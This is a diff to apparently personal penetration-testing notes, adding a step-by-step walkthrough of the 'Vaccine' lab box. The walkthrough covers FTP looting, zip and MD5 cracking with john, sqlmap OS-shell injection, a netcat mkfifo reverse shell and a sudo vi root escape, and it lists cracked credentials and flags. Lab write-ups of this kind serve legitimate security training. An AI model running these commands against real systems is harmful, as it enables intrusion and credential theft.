@@ -58,6 +58,12 @@ nc -l -p port [-options] [hostname] [port]
 gobuster [command]
 ```
 
+**john**: tool to crack weak passwords
+
+```
+john [options] password-files
+```
+
 --------------------------------------------------------------------
 
 **WINDOWS CMDs**:<br>
@@ -259,3 +265,88 @@ bugtracker
 ```
 
 FLAG: af13b0bee69f8a877c3faf667f7beacf
+
+--------------------------------------------------------------------
+
+## VACCINE BOX
+
+**TOOLS USED**: nmap, john, sqlmap
+
+**IP Address**: 10.129.25.68
+
+```
+nmap -sC -sV -p- -oN vaccine_nmap.txt 10.129.25.68
+```
+
+**EXPOSED PORT (SERVICE)**:<br>
+21 (ftp),<br>
+22 (ssh), <br>
+80 (http)
+
+
+FTP anonymous login allowed.
+
+```
+ftp anonymous@10.129.25.68
+ls
+get backup.zip
+```
+
+```
+zip2john backup.zip > 4john.txt
+john 4john.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+BACKUP.ZIP PASSWORD: 741852963<br>
+USER: admin<br>
+PASSWORD HASH: 2cb42f8734ea607eefed3b70af13bbd3
+
+```
+john password.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
+```
+
+PASSWORD: qwerty789
+
+```
+sqlmap -u http://10.129.25.68/dashboard.php\?search\=bmw --cookie="PHPSESSID=1k1l8fdirbj26c9i8rrbg2t9gm" --os-shell
+```
+
+--os-shell to get interactive shell once sql injection is complete <br>
+--cookie either use Burp Suite or inspect element (Application > Storage)
+
+```
+nc -nlvp 4444
+```
+
+inject netcat reverse shell
+```
+> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.252 4444 >/tmp/f
+```
+
+```
+cd /var/www/html
+grep -iR "pass" *
+```
+
+USER: postgres
+PASSWORD: P@s5w0rd!
+
+```
+ssh postgres@10.129.25.68
+```
+
+USER.TXT: ec9b13ca4d6229cd5cc1e09980965bf7
+
+```
+sudo -l
+```
+
+TARGET: /bin/vi
+
+```
+sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+:set shell=/bin/sh
+:shell
+```
+
+FLAG: dd6e058e814260bc70e9bbdef2715849
